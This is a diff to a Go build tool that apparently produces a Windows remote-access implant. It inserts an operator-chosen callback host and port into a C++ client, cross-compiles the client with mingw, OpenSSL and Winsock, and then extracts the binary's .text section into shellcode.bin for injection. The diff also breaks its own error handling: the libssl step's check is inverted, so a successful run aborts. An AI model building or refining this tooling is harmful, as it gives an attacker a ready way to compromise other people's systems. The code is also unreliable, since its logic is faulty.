@@ -1,6 +1,7 @@
 package main
 
 import (
+	"debug/pe"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -12,7 +13,7 @@ import (
 	"strings"
 )
 
-func runCommand(command string, args ...string) {
+func runCommand(command string, args ...string) bool {
 	cmd := exec.Command(command, args...)
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
@@ -20,9 +21,10 @@ func runCommand(command string, args ...string) {
 	err := cmd.Run()
 	if err != nil {
 		fmt.Println("\033[1m\033[31m[-] Error:\033[0m", err)
-		return
+		return false
 	}
 	fmt.Println("\033[1m\033[32m[+] Command executed successfully:\033[0m", command, args)
+	return true
 }
 
 func editPlaceholder(path string, placeholder string, value string) {
@@ -110,16 +112,22 @@ func main() {
 	}
 
 	fmt.Println("\033[1m\033[32m[+] Directory successfully copied to\033[0m", destination)
-
 	editPlaceholder("./temp/client/client.cpp", "{HOST_PLACEHOLDER}", *remoteHost)
 	editPlaceholder("./temp/client/client.cpp", "{PORT_PLACEHOLDER}", strconv.Itoa(*remotePort))
 
-	fmt.Println("\033[1m\033[33m[$] Compiling payload\033[0m")
+	fmt.Println("\033[1m\033[33m[$] Compiling shellcode\033[0m")
 
-	runCommand("x86_64-w64-mingw32-dlltool", "-d", "./temp/client/lib/MT/libcrypto.def", "-l", "./temp/client/lib/MT/libcrypto.a", "-k")
-	runCommand("x86_64-w64-mingw32-dlltool", "-d", "./temp/client/lib/MT/libssl.def", "-l", "./temp/client/lib/MT/libssl.a", "-k")
+	if !runCommand("x86_64-w64-mingw32-dlltool", "-d", "./temp/client/lib/MT/libcrypto.def", "-l", "./temp/client/lib/MT/libcrypto.a", "-k") {
+		fmt.Println("\033[1m\033[31m[-] Error while compiling shellcode\033[0m")
+		return
+	}
 
-	runCommand("x86_64-w64-mingw32-g++", "-o", *optFN,
+	if runCommand("x86_64-w64-mingw32-dlltool", "-d", "./temp/client/lib/MT/libssl.def", "-l", "./temp/client/lib/MT/libssl.a", "-k") {
+		fmt.Println("\033[1m\033[31m[-] Error while compiling shellcode\033[0m")
+		return
+	}
+
+	if runCommand("x86_64-w64-mingw32-g++", "-o", *optFN,
 		"./temp/client/client.cpp",
 		"./temp/client/src/Exec.cpp",
 		"./temp/client/src/Serialization.cpp",
@@ -129,7 +137,10 @@ func main() {
 		"-L/usr/x86_64-w64-mingw32/lib",
 		"-lcrypto", "-lssl", "-lws2_32", "-lcrypt32",
 		"-DJSON_DIAGNOSTICS=1", "-static", "-static-libgcc", "-static-libstdc++",
-		"-Wl,-subsystem,console", "-Wl,-entry,mainCRTStartup")
+		"-Wl,-subsystem,console", "-Wl,-entry,mainCRTStartup") {
+		fmt.Println("\033[1m\033[31m[-] Error while compiling shellcode\033[0m")
+		return
+	}
 
 	if *isConfFile {
 
@@ -158,5 +169,39 @@ func main() {
 		fmt.Println("\033[1m\033[32m[+] Configuration file created successfully in:\033[0m", confFileName)
 	}
 
-	fmt.Println("\033[1m\033[32m[+] Payload successfully compiled\033[0m")
+	fmt.Println("\033[1m\033[32m[+] Shellcode successfully compiled\033[0m")
+
+	//Extract shellcode (from .text)
+
+	execFile, err := os.Open(*optFN)
+	if err != nil {
+		fmt.Println("\033[1m\033[31m[-] Error while reading file:\033[0m", err)
+		return
+	}
+	defer execFile.Close()
+
+	fmt.Println("\033[1m\033[33m[$] Extracting shellcode from .text\033[0m")
+
+	peFile, err := pe.NewFile(execFile)
+	if err != nil {
+		fmt.Println("\033[1m\033[31m[-] Error while reading PE file:\033[0m", err)
+		return
+	}
+
+	for _, section := range peFile.Sections {
+		fmt.Println("\u001B[1m\u001B[34m[>] Section found: \u001B[0m", section.Name, " \u001B[1m\u001B[34m(\u001B[0m", section.Size, " \u001B[1m\u001B[34mbytes)\u001B[0m")
+		if section.Name == ".text" {
+			data, err := section.Data()
+			if err != nil {
+				fmt.Println("\u001B[1m\u001B[31m[-] Error while reading .text section data:\u001B[0m", err)
+				return
+			}
+
+			err = os.WriteFile("shellcode.bin", data, os.ModePerm)
+			if err != nil {
+				fmt.Println("\u001B[1m\u001B[31m[-] Error while writing shellcode to file:\u001B[0m", err)
+			}
+			fmt.Println("\033[1m\033[32m[+] Shellcode successfully saved in \033[0mshellcode.bin")
+		}
+	}
 }
